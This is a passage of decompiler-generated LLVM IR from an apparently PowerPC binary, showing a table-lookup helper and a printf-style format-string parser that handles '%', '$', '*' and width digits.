  uselistorder i32 %v1_10005f44, { 1, 0 }
  uselistorder i32 %v1_10005f3c, { 2, 0, 1 }
  uselistorder i32 %v1_10005ee8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_10005edc, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_10005ed4, { 1, 0 }
  uselistorder i32 %v2_10005fe8, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1000600c5, { 1, 0, 2 }
  uselistorder i32 %v3_10005e7c, { 1, 0, 2 }
  uselistorder i32 %v2_10005eac, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_10005e24, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_10005e1c, { 1, 0, 2 }
  uselistorder i32 %v0_10005e1c, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_gt.global-to-local, { 2, 3, 4, 13, 5, 6, 7, 8, 1, 19, 9, 10, 11, 12, 0, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_1000605c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000603c, { 1, 0 }
  uselistorder label %dec_label_pc_10006008, { 1, 0 }
  uselistorder label %dec_label_pc_10006004, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10005ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10005fcc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10005f80, { 1, 0 }
  uselistorder label %dec_label_pc_10005f6c, { 1, 0 }
  uselistorder label %dec_label_pc_10005ed4, { 1, 0 }
  uselistorder label %dec_label_pc_1000600c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10005ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10005e7c, { 1, 0 }
  uselistorder label %dec_label_pc_10005e70, { 1, 0 }
}

define i32 @function_1000608c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000608c:
  br label %dec_label_pc_10006098

dec_label_pc_10006098:                            ; preds = %dec_label_pc_10006098, %dec_label_pc_1000608c
  %v0_10006098 = phi i32 [ ptrtoint (i32* @global_var_1000e0f0.228 to i32), %dec_label_pc_1000608c ], [ %v1_10006098, %dec_label_pc_10006098 ]
  %v1_10006098 = add i32 %v0_10006098, -2
  %v2_10006098 = inttoptr i32 %v1_10006098 to i16*
  %v3_10006098 = load i16, i16* %v2_10006098, align 2
  %v4_10006098 = sext i16 %v3_10006098 to i32
  %v4_1000609c = icmp eq i32 %v4_10006098, %arg1
  %v3_100060a0.not = icmp ule i32 %v1_10006098, ptrtoint (i32* @global_var_1000e0d8.229 to i32)
  %brmerge = or i1 %v4_1000609c, %v3_100060a0.not
  br i1 %brmerge, label %dec_label_pc_100060ac, label %dec_label_pc_10006098

dec_label_pc_100060ac:                            ; preds = %dec_label_pc_10006098
  %v2_100060b4 = sub i32 %v1_10006098, ptrtoint (i32* @global_var_1000e0d8.229 to i32)
  %v1_100060bc = udiv i32 %v2_100060b4, 2
  %v2_100060bc = and i32 %v2_100060b4, -2147483648
  %v3_100060bc = or i32 %v1_100060bc, %v2_100060bc
  %v2_100060c4 = add i32 %v3_100060bc, ptrtoint (i32* @global_var_1000e0f0.228 to i32)
  %v3_100060c4 = inttoptr i32 %v2_100060c4 to i8*
  %v4_100060c4 = load i8, i8* %v3_100060c4, align 1
  %v5_100060c4 = zext i8 %v4_100060c4 to i32
  ret i32 %v5_100060c4

; uselistorder directives
  uselistorder i32 %v2_100060b4, { 1, 0 }
  uselistorder i32 %v1_10006098, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e0d8.229 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e0f0.228 to i32), { 1, 0 }
}

define i32 @function_100060cc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100060cc:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_100060cc = load i32, i32* @lr, align 4
  store i32 %v0_100060cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_100060e4 = add i32 %tmp, 16
  %v2_100060e4 = inttoptr i32 %v1_100060e4 to i32*
  %v3_100060e4 = load i32, i32* %v2_100060e4, align 4
  %v1_100060ec = and i32 %v3_100060e4, 128
  store i32 %v1_100060ec, i32* %r6.global-to-local, align 4
  %v3_100060ec = icmp eq i32 %v1_100060ec, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_10006100 = add i32 %tmp, 24
  %v2_10006100 = inttoptr i32 %v1_10006100 to i32*
  %v3_10006100 = load i32, i32* %v2_10006100, align 4
  store i32 %v3_10006100, i32* @r26, align 4
  br i1 %v3_100060ec, label %dec_label_pc_10006108, label %dec_label_pc_10006120

dec_label_pc_10006108:                            ; preds = %dec_label_pc_100060cc
  %v2_10006108 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_10006174

dec_label_pc_10006118:                            ; preds = %dec_label_pc_10006348
  %v1_10006118 = add i32 %v0_10006318, 1
  store i32 %v1_10006118, i32* @r30, align 4
  br label %dec_label_pc_10006360

dec_label_pc_10006120:                            ; preds = %dec_label_pc_100060cc
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_10006124 = load i32, i32* %arg1, align 4
  store i32 %v2_10006124, i32* %r8.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10006130 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10006130, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10006134

dec_label_pc_10006134:                            ; preds = %dec_label_pc_10006164.dec_label_pc_10006134_crit_edge, %dec_label_pc_10006120
  %v0_1000613c = phi i32 [ %v0_1000613c.pre, %dec_label_pc_10006164.dec_label_pc_10006134_crit_edge ], [ %v2_10006124, %dec_label_pc_10006120 ]
  %v0_10006138 = phi i32 [ %v0_10006138.pre, %dec_label_pc_10006164.dec_label_pc_10006134_crit_edge ], [ %v2_10006130, %dec_label_pc_10006120 ]
  %v0_10006140 = phi i32 [ %v0_10006134.pre, %dec_label_pc_10006164.dec_label_pc_10006134_crit_edge ], [ 0, %dec_label_pc_10006120 ]
  %v1_10006134 = mul i32 %v0_10006140, 4
  %v2_10006138 = add i32 %v0_10006140, %v0_10006138
  store i32 %v2_10006138, i32* %r9.global-to-local, align 4
  %v2_1000613c = add i32 %v1_10006134, %v0_1000613c
  store i32 %v2_1000613c, i32* %r11.global-to-local, align 4
  %v1_10006140 = add i32 %v0_10006140, 1
  store i32 %v1_10006140, i32* %r10.global-to-local, align 4
  %v1_10006144 = add i32 %v2_1000613c, -4
  %v2_10006144 = inttoptr i32 %v1_10006144 to i32*
  %v3_10006144 = load i32, i32* %v2_10006144, align 4
  store i32 %v3_10006144, i32* %r0.global-to-local, align 4
  %v1_10006148 = trunc i32 %v3_10006144 to i8
  %v3_10006148 = add i32 %v2_10006138, 24
  %v4_10006148 = inttoptr i32 %v3_10006148 to i8*
  store i8 %v1_10006148, i8* %v4_10006148, align 1
  %v0_1000614c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000614c = urem i32 %v0_1000614c, 256
  store i32 %v1_1000614c, i32* %r0.global-to-local, align 4
  %v0_10006154 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006154 = add i32 %v0_10006154, -4
  %v2_10006154 = inttoptr i32 %v1_10006154 to i32*
  %v3_10006154 = load i32, i32* %v2_10006154, align 4
  store i32 %v3_10006154, i32* %r9.global-to-local, align 4
  %v4_10006158 = icmp eq i32 %v1_1000614c, %v3_10006154
  br i1 %v4_10006158, label %dec_label_pc_10006160, label %dec_label_pc_100065d0

dec_label_pc_10006160:                            ; preds = %dec_label_pc_10006134
  %v3_10006150 = icmp eq i32 %v1_1000614c, 0
  br i1 %v3_10006150, label %dec_label_pc_10006168, label %dec_label_pc_10006164

dec_label_pc_10006164:                            ; preds = %dec_label_pc_10006160
  %v0_10006164 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006164 = add i32 %v0_10006164, -1
  store i32 %v1_10006164, i32* %ctr.global-to-local, align 4
  %v2_10006164 = icmp eq i32 %v1_10006164, 0
  br i1 %v2_10006164, label %dec_label_pc_10006168, label %dec_label_pc_10006164.dec_label_pc_10006134_crit_edge

dec_label_pc_10006164.dec_label_pc_10006134_crit_edge: ; preds = %dec_label_pc_10006164
  %v0_10006134.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_10006138.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000613c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10006134

dec_label_pc_10006168:                            ; preds = %dec_label_pc_10006164, %dec_label_pc_10006160
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000616c = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_10006174

dec_label_pc_10006174:                            ; preds = %dec_label_pc_10006108, %dec_label_pc_10006168
  %v2_10006184.pre-phi = phi i32 [ %.pre, %dec_label_pc_10006108 ], [ %v2_10006130, %dec_label_pc_10006168 ]
  %storemerge3 = phi i32 [ %v2_10006108, %dec_label_pc_10006108 ], [ %v2_1000616c, %dec_label_pc_10006168 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r27, align 4
  store i32 %v2_10006184.pre-phi, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10006194

dec_label_pc_10006190:                            ; preds = %dec_label_pc_100062a0, %dec_label_pc_10006324
  %v0_10006190 = phi i32 [ %v1_10006324, %dec_label_pc_10006324 ], [ %v0_10006288, %dec_label_pc_100062a0 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_10006324 ], [ %stack_var_-84.2, %dec_label_pc_100062a0 ]
  store i32 %v0_10006190, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10006194

dec_label_pc_10006194:                            ; preds = %dec_label_pc_10006174, %dec_label_pc_10006190
  %v0_100061a8 = phi i32 [ %storemerge3, %dec_label_pc_10006174 ], [ %v0_10006190, %dec_label_pc_10006190 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_10006174 ], [ %stack_var_-84.0, %dec_label_pc_10006190 ]
  %v1_10006194 = inttoptr i32 %v0_100061a8 to i8*
  %v2_10006194 = load i8, i8* %v1_10006194, align 1
  %v3_10006194 = zext i8 %v2_10006194 to i32
  store i32 %v3_10006194, i32* %r0.global-to-local, align 4
  store i32 %v0_100061a8, i32* @r30, align 4
  %v3_1000619c = icmp eq i8 %v2_10006194, 42
  br i1 %v3_1000619c, label %dec_label_pc_100061a4, label %dec_label_pc_100061b4

dec_label_pc_100061a4:                            ; preds = %dec_label_pc_10006194
  %v0_100061a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_100061a4 = mul i32 %v0_100061a4, -4
  store i32 %v1_100061a4, i32* %r0.global-to-local, align 4
  %v1_100061a8 = add i32 %v0_100061a8, 1
  store i32 %v1_100061a8, i32* @r30, align 4
  %v0_100061ac = load i32, i32* @r1, align 4
  %v2_100061ac = add i32 %v0_100061ac, %v1_100061a4
  store i32 %v2_100061ac, i32* %r9.global-to-local, align 4
  %v0_100061b0 = load i32, i32* @r29, align 4
  %v2_100061b0 = add i32 %v2_100061ac, 8
  %v3_100061b0 = inttoptr i32 %v2_100061b0 to i32*
  store i32 %v0_100061b0, i32* %v3_100061b0, align 4
  %v0_100061cc.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100061b4

dec_label_pc_100061b4:                            ; preds = %dec_label_pc_10006194, %dec_label_pc_100061a4
  %v0_100061cc.pre = phi i32 [ %v0_100061a8, %dec_label_pc_10006194 ], [ %v0_100061cc.pre.pre, %dec_label_pc_100061a4 ]
  %v0_100061b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100061b4 = add i32 %v0_100061b4, 1100
  %v2_100061b4 = inttoptr i32 %v1_100061b4 to i32*
  %v3_100061b4 = load i32, i32* %v2_100061b4, align 4
  store i32 %v3_100061b4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100061cc

dec_label_pc_100061c0:                            ; preds = %dec_label_pc_100061cc
  %v2_100061d0 = icmp sgt i32 %v0_10006218, 4094
  br i1 %v2_100061d0, label %dec_label_pc_100061c8, label %dec_label_pc_100061c4

dec_label_pc_100061c4:                            ; preds = %dec_label_pc_100061c0
  %v1_100061c4 = add i32 %v2_100061e4, -48
  store i32 %v1_100061c4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100061c8

dec_label_pc_100061c8:                            ; preds = %dec_label_pc_100061c0, %dec_label_pc_100061c4
  %v0_100061d015 = phi i32 [ %v0_10006218, %dec_label_pc_100061c0 ], [ %v1_100061c4, %dec_label_pc_100061c4 ]
  %v1_100061c8 = add i32 %v0_10006248, 1
  store i32 %v1_100061c8, i32* @r30, align 4
  br label %dec_label_pc_100061cc

dec_label_pc_100061cc:                            ; preds = %dec_label_pc_100061b4, %dec_label_pc_100061c8
  %v0_10006218 = phi i32 [ 0, %dec_label_pc_100061b4 ], [ %v0_100061d015, %dec_label_pc_100061c8 ]
  %v0_10006248 = phi i32 [ %v0_100061cc.pre, %dec_label_pc_100061b4 ], [ %v1_100061c8, %dec_label_pc_100061c8 ]
  %v1_100061cc = inttoptr i32 %v0_10006248 to i8*
  %v2_100061cc = load i8, i8* %v1_100061cc, align 1
  %v3_100061cc = zext i8 %v2_100061cc to i32
  store i32 %v3_100061cc, i32* %r11.global-to-local, align 4
  %v1_100061d4 = mul nuw nsw i32 %v3_100061cc, 2
  store i32 %v1_100061d4, i32* %r9.global-to-local, align 4
  %v2_100061d8 = add i32 %v1_100061d4, %v3_100061b4
  %v3_100061d8 = inttoptr i32 %v2_100061d8 to i16*
  %v4_100061d8 = load i16, i16* %v3_100061d8, align 2
  %v5_100061d8 = zext i16 %v4_100061d8 to i32
  store i32 %v5_100061d8, i32* %r0.global-to-local, align 4
  %v1_100061dc = mul i32 %v0_10006218, 10
  %v1_100061e0 = and i32 %v5_100061d8, 8
  store i32 %v1_100061e0, i32* @r25, align 4
  %v3_100061e0 = icmp eq i32 %v1_100061e0, 0
  %v2_100061e4 = add i32 %v3_100061cc, %v1_100061dc
  store i32 %v2_100061e4, i32* %r9.global-to-local, align 4
  br i1 %v3_100061e0, label %dec_label_pc_100061ec, label %dec_label_pc_100061c0

dec_label_pc_100061ec:                            ; preds = %dec_label_pc_100061cc
  %v0_100061ec = load i32, i32* %r10.global-to-local, align 4
  %v1_100061ec = add i32 %v0_100061ec, -1
  %v2_100061ec = inttoptr i32 %v1_100061ec to i8*
  %v3_100061ec = load i8, i8* %v2_100061ec, align 1
  %v4_100061ec = zext i8 %v3_100061ec to i32
  store i32 %v4_100061ec, i32* %r0.global-to-local, align 4
  %v3_100061f0 = icmp eq i8 %v3_100061ec, 37
  br i1 %v3_100061f0, label %dec_label_pc_100061f8, label %dec_label_pc_100062c0

dec_label_pc_100061f8:                            ; preds = %dec_label_pc_100061ec
  %v3_100061f8 = icmp eq i8 %v2_100061cc, 36
  br i1 %v3_100061f8, label %dec_label_pc_10006200, label %dec_label_pc_10006234

dec_label_pc_10006200:                            ; preds = %dec_label_pc_100061f8
  %tmp58 = icmp slt i32 %v0_10006218, 1
  br i1 %tmp58, label %dec_label_pc_10006234, label %dec_label_pc_10006208

dec_label_pc_10006208:                            ; preds = %dec_label_pc_10006200
  %v0_10006208 = load i32, i32* @r26, align 4
  %v3_10006208 = icmp eq i32 %v0_10006208, 0
  %v1_1000620c = add i32 %v0_10006248, 1
  store i32 %v1_1000620c, i32* %r10.global-to-local, align 4
  br i1 %v3_10006208, label %dec_label_pc_100065d0, label %dec_label_pc_10006214

dec_label_pc_10006214:                            ; preds = %dec_label_pc_10006208
  %v3_10006214 = icmp sgt i32 %v0_10006218, %v0_10006208
  br i1 %v3_10006214, label %dec_label_pc_10006220, label %dec_label_pc_1000622c

dec_label_pc_10006220:                            ; preds = %dec_label_pc_10006214
  store i32 %v0_10006218, i32* @r26, align 4
  br label %dec_label_pc_1000622c

dec_label_pc_10006228:                            ; preds = %dec_label_pc_10006250, %dec_label_pc_10006248
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000622c

dec_label_pc_1000622c:                            ; preds = %dec_label_pc_10006214, %dec_label_pc_10006220, %dec_label_pc_10006228
  %v0_1000622c = phi i32 [ %v0_100061ec, %dec_label_pc_10006228 ], [ %v1_1000620c, %dec_label_pc_10006220 ], [ %v1_1000620c, %dec_label_pc_10006214 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_10006228 ], [ %v0_10006218, %dec_label_pc_10006220 ], [ %v0_10006218, %dec_label_pc_10006214 ]
  br label %dec_label_pc_10006268

dec_label_pc_10006234:                            ; preds = %dec_label_pc_100061f8, %dec_label_pc_10006200
  %v0_10006234 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_10006234, 1
  br i1 %tmp59, label %dec_label_pc_10006248, label %dec_label_pc_1000623c

dec_label_pc_1000623c:                            ; preds = %dec_label_pc_10006234
  %v3_1000623c = icmp eq i8 %v2_100061cc, 109
  br i1 %v3_1000623c, label %dec_label_pc_100062c0, label %dec_label_pc_100065d0

dec_label_pc_10006248:                            ; preds = %dec_label_pc_10006234
  %v3_10006248 = icmp ugt i32 %v0_10006248, %v0_100061ec
  br i1 %v3_10006248, label %dec_label_pc_10006250, label %dec_label_pc_10006228

dec_label_pc_10006250:                            ; preds = %dec_label_pc_10006248
  %v1_10006250 = inttoptr i32 %v0_100061ec to i8*
  %v2_10006250 = load i8, i8* %v1_10006250, align 1
  %v3_10006250 = zext i8 %v2_10006250 to i32
  store i32 %v3_10006250, i32* %r0.global-to-local, align 4
  store i32 %v0_100061ec, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000625c = icmp eq i8 %v2_10006250, 48
  br i1 %v3_1000625c, label %dec_label_pc_10006228, label %dec_label_pc_100062c4

dec_label_pc_10006268:                            ; preds = %dec_label_pc_10006284, %dec_label_pc_1000622c
  %v0_10006288 = phi i32 [ %v0_1000622c, %dec_label_pc_1000622c ], [ %v1_10006288, %dec_label_pc_10006284 ]
  store i32 %v0_10006288, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000e0d0.232 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_10006278 = inttoptr i32 %v0_10006288 to i8*
  br label %dec_label_pc_10006270

dec_label_pc_10006270:                            ; preds = %dec_label_pc_10006290, %dec_label_pc_10006268
  %v1_10006284 = phi i32 [ %v1_10006294, %dec_label_pc_10006290 ], [ 1, %dec_label_pc_10006268 ]
  %v0_10006270 = phi i32 [ %v1_10006274, %dec_label_pc_10006290 ], [ ptrtoint ([8 x i8]* @global_var_1000e0d0.232 to i32), %dec_label_pc_10006268 ]
  %v1_10006270 = inttoptr i32 %v0_10006270 to i8*
  %v2_10006270 = load i8, i8* %v1_10006270, align 1
  %v3_10006270 = zext i8 %v2_10006270 to i32
  store i32 %v3_10006270, i32* %r9.global-to-local, align 4
  %v1_10006274 = add i32 %v0_10006270, 1
  store i32 %v1_10006274, i32* %r11.global-to-local, align 4
  %v2_10006278 = load i8, i8* %v1_10006278, align 1
  %v3_10006278 = zext i8 %v2_10006278 to i32
  store i32 %v3_10006278, i32* %r0.global-to-local, align 4
  %v4_1000627c = icmp eq i8 %v2_10006278, %v2_10006270
  br i1 %v4_1000627c, label %dec_label_pc_10006284, label %dec_label_pc_10006290

dec_label_pc_10006284:                            ; preds = %dec_label_pc_10006270
  %v0_10006284 = load i32, i32* %r6.global-to-local, align 4
  %v2_10006284 = or i32 %v0_10006284, %v1_10006284
  store i32 %v2_10006284, i32* %r6.global-to-local, align 4
  %v1_10006288 = add i32 %v0_10006288, 1
  br label %dec_label_pc_10006268

dec_label_pc_10006290:                            ; preds = %dec_label_pc_10006270
  %v1_10006290 = inttoptr i32 %v1_10006274 to i8*
  %v2_10006290 = load i8, i8* %v1_10006290, align 1
  %v3_10006290 = zext i8 %v2_10006290 to i32
  store i32 %v3_10006290, i32* %r0.global-to-local, align 4
  %v1_10006294 = mul i32 %v1_10006284, 2
  store i32 %v1_10006294, i32* %r10.global-to-local, align 4
  %v3_10006298 = icmp eq i8 %v2_10006290, 0
  br i1 %v3_10006298, label %dec_label_pc_100062a0, label %dec_label_pc_10006270

dec_label_pc_100062a0:                            ; preds = %dec_label_pc_10006290
  %v1_100062a0 = add i32 %v0_10006288, -1
  %v2_100062a0 = inttoptr i32 %v1_100062a0 to i8*
  %v3_100062a0 = load i8, i8* %v2_100062a0, align 1
  %v4_100062a0 = zext i8 %v3_100062a0 to i32
  store i32 %v4_100062a0, i32* %r0.global-to-local, align 4
  %v0_100062a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_100062a4 = and i32 %v0_100062a4, 10
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_100062ac = icmp eq i8 %v3_100062a0, 37
  %v1_100062b0 = udiv i32 %v1_100062a4, 2
  store i32 %v1_100062b0, i32* %r9.global-to-local, align 4
  %v2_100062b4 = sub nuw nsw i32 -1, %v1_100062b0
  %v3_100062b4 = and i32 %v0_100062a4, %v2_100062b4
  store i32 %v3_100062b4, i32* %r6.global-to-local, align 4
  br i1 %v3_100062ac, label %dec_label_pc_100062c4, label %dec_label_pc_10006190

dec_label_pc_100062c0:                            ; preds = %dec_label_pc_100061ec, %dec_label_pc_1000623c
  store i32 %v0_100061ec, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100062c4

dec_label_pc_100062c4:                            ; preds = %dec_label_pc_10006250, %dec_label_pc_100062a0, %dec_label_pc_100062c0
  %v0_100062f8 = phi i32 [ 0, %dec_label_pc_100062a0 ], [ %v0_10006218, %dec_label_pc_10006250 ], [ %v0_10006218, %dec_label_pc_100062c0 ]
  %v1_10006304 = phi i32 [ %v0_10006288, %dec_label_pc_100062a0 ], [ %v0_10006248, %dec_label_pc_10006250 ], [ %v0_10006248, %dec_label_pc_100062c0 ]
  %v0_10006300 = phi i32 [ %v1_10006274, %dec_label_pc_100062a0 ], [ %v0_100061ec, %dec_label_pc_10006250 ], [ %v0_100061ec, %dec_label_pc_100062c0 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_100062a0 ], [ %stack_var_-84.1, %dec_label_pc_10006250 ], [ %stack_var_-84.1, %dec_label_pc_100062c0 ]
  %v1_100062c4 = inttoptr i32 %v0_10006300 to i8*
  %v2_100062c4 = load i8, i8* %v1_100062c4, align 1
  %v3_100062c4 = zext i8 %v2_100062c4 to i32
  store i32 %v3_100062c4, i32* %r0.global-to-local, align 4
  %v3_100062c8 = icmp eq i8 %v2_100062c4, 42
  br i1 %v3_100062c8, label %dec_label_pc_100062d0, label %dec_label_pc_10006310

dec_label_pc_100062d0:                            ; preds = %dec_label_pc_100062c4
  %v0_100062d0 = load i32, i32* @r26, align 4
  %v3_100062d0 = icmp eq i32 %v0_100062d0, 0
  br i1 %v3_100062d0, label %dec_label_pc_10006300, label %dec_label_pc_100062d8

dec_label_pc_100062d8:                            ; preds = %dec_label_pc_100062d0
  %v1_100062d8 = inttoptr i32 %v1_10006304 to i8*
  %v2_100062d8 = load i8, i8* %v1_100062d8, align 1
  %v3_100062d8 = zext i8 %v2_100062d8 to i32
  store i32 %v3_100062d8, i32* %r0.global-to-local, align 4
  %v3_100062dc = icmp eq i8 %v2_100062d8, 36
  br i1 %v3_100062dc, label %dec_label_pc_100062e4, label %dec_label_pc_100065d0

dec_label_pc_100062e4:                            ; preds = %dec_label_pc_100062d8
  %tmp60 = icmp slt i32 %v0_100062f8, 1
  br i1 %tmp60, label %dec_label_pc_100065d0, label %dec_label_pc_100062ec

dec_label_pc_100062ec:                            ; preds = %dec_label_pc_100062e4
  %v0_100062ec = load i32, i32* %r5.global-to-local, align 4
  %v1_100062ec = mul i32 %v0_100062ec, -4
  %v1_100062f0 = add i32 %v1_10006304, 1
  store i32 %v1_100062f0, i32* @r30, align 4
  %v0_100062f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_100062f4 = add i32 %v0_100062f4, %v1_100062ec
  store i32 %v2_100062f4, i32* %r9.global-to-local, align 4
  %v2_100062f8 = add i32 %v2_100062f4, 12
  %v3_100062f8 = inttoptr i32 %v2_100062f8 to i32*
  store i32 %v0_100062f8, i32* %v3_100062f8, align 4
  %v0_10006318.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000630c

dec_label_pc_10006300:                            ; preds = %dec_label_pc_100062d0
  %v1_10006300 = add i32 %v0_10006300, 1
  store i32 %v1_10006300, i32* %r0.global-to-local, align 4
  %v4_10006304 = icmp eq i32 %v1_10006300, %v1_10006304
  br i1 %v4_10006304, label %dec_label_pc_1000630c, label %dec_label_pc_100065d0

dec_label_pc_1000630c:                            ; preds = %dec_label_pc_10006300, %dec_label_pc_100062ec
  %v0_10006318.pre = phi i32 [ %v1_10006304, %dec_label_pc_10006300 ], [ %v0_10006318.pre.pre, %dec_label_pc_100062ec ]
  store i32 -2147483648, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10006310

dec_label_pc_10006310:                            ; preds = %dec_label_pc_100062c4, %dec_label_pc_1000630c
  %v0_10006318 = phi i32 [ %v1_10006304, %dec_label_pc_100062c4 ], [ %v0_10006318.pre, %dec_label_pc_1000630c ]
  %v0_10006328 = phi i32 [ %v0_100062f8, %dec_label_pc_100062c4 ], [ -2147483648, %dec_label_pc_1000630c ]
  %v0_10006310 = load i32, i32* %r5.global-to-local, align 4
  %v3_10006310 = icmp eq i32 %v0_10006310, 0
  %v1_10006318 = inttoptr i32 %v0_10006318 to i8*
  br i1 %v3_10006310, label %dec_label_pc_10006318, label %dec_label_pc_1000633c

dec_label_pc_10006318:                            ; preds = %dec_label_pc_10006310
  %v2_10006318 = load i8, i8* %v1_10006318, align 1
  %v3_10006318 = zext i8 %v2_10006318 to i32
  store i32 %v3_10006318, i32* %r0.global-to-local, align 4
  %v3_1000631c = icmp eq i8 %v2_10006318, 46
  br i1 %v3_1000631c, label %dec_label_pc_10006324, label %dec_label_pc_10006334

dec_label_pc_10006324:                            ; preds = %dec_label_pc_10006318
  %v1_10006324 = add i32 %v0_10006318, 1
  store i32 %v0_10006328, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10006190

dec_label_pc_10006334:                            ; preds = %dec_label_pc_10006318
  store i32 %v0_10006328, i32* @r31, align 4
  br label %dec_label_pc_1000633c

dec_label_pc_1000633c:                            ; preds = %dec_label_pc_10006310, %dec_label_pc_10006334
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10006334 ], [ %v0_10006328, %dec_label_pc_10006310 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v2_10006340 = load i8, i8* %v1_10006318, align 1
  %v3_10006340 = zext i8 %v2_10006340 to i32
  store i32 %v3_10006340, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000e078.233 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006348

dec_label_pc_10006348:                            ; preds = %dec_label_pc_10006354, %dec_label_pc_1000633c
  %v0_10006354 = phi i32 [ %v1_10006354, %dec_label_pc_10006354 ], [ ptrtoint ([9 x i8]* @global_var_1000e078.233 to i32), %dec_label_pc_1000633c ]
  %v1_10006348 = inttoptr i32 %v0_10006354 to i8*
  %v2_10006348 = load i8, i8* %v1_10006348, align 1
  %v3_10006348 = zext i8 %v2_10006348 to i32
